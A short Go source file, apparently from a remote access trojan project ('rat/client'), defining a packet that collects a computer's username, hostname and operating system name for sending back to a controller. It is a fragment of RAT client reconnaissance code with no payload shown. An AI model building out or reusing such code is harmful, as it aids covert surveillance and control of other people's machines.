package main

import (
	"fmt"
	"oslib"
	"rat/client/computer"
	"rat/common"
)

type ComputerInfoPacket struct {
	Username                   string `send`
	Hostname                   string `send`
	OperatingSystemName        string `send`
	OperatingSystemDisplayName string `send`
}

func (packet ComputerInfoPacket) Header() common.PacketHeader {
	return common.ComputerInfoHeader
}

func (packet *ComputerInfoPacket) Init() {
	u := computer.GetComputerInformation()

	packet.Username = u.Username
	packet.Hostname = u.Hostname
	packet.OperatingSystemName = oslib.Name
	packet.OperatingSystemDisplayName = oslib.GetDisplay()

	fmt.Println("Inside init()", packet)
}
